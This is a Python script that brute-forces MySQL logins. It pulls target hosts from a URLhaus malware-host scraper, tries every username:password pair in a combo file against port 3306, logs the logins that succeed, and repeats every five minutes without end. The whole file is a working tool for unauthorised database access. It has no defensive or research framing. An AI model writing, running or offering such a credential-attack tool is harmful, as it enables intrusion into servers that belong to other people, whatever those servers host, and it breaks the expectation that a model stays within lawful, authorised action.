from time import sleep
import scraper.urlhaus_scraper as urlhaus_scraper
import pymysql

already_connected = set()


def connect(host: str, user: str, password: str, port: int = 3306) -> pymysql.Connection:
    """
    Opens a connection to specified mysql server or raises an exception if failed.

    :param host: mysql host
    :param port: mysql port
    :param user: mysql user
    :param password: mysql password
    :return: Connection to the mysql server.
    """
    connection = pymysql.connect(host=host, user=user, password=password,
                                 port=port, charset='utf8mb4', cursorclass=pymysql.cursors.DictCursor,
                                 read_timeout=5, write_timeout=5, connect_timeout=5)
    return connection


def brute(hosts: set[str], combo: set[str]):
    """
    Goes through the specified hosts and tries to
    connect with the given combo set.

    :param hosts: set of hosts
    :param combo: set usernames and passwords
    """
    global already_connected
    for host in hosts:
        port = 3306
        if host in already_connected:
            log(f"Already tried to connect to {host}, skipping...")
            continue

        for login in combo:
            login = login.split(":")
            user = login[0]
            password = login[1].replace("\n", "")
            log(f"Attempting to connect to {host}:{port} using {user}:{password} -> ", end="")

            try:
                connect(host, user, password, port)
            except Exception as e:
                log(f"Failed: {str(e)}")
            else:
                log("Success")
                log(f"Successfully connected to {host}:{port} using {user}:{password}", save=True)

        already_connected.add(host)


def log(message: str, end: str = "\n", save: bool = False):
    print(message, end=end)
    if save:
        with open("log.txt", "a") as file:
            file.write(message + end)


if __name__ == '__main__':
    while True:
        hosts = set(urlhaus_scraper.load_hosts())

        combo_file = open("combo.txt", "r")
        combo = set(combo_file.readlines())
        combo_file.close()

        brute(hosts, combo)
        log("Done, sleeping for 5 minutes now...")
        sleep(300)
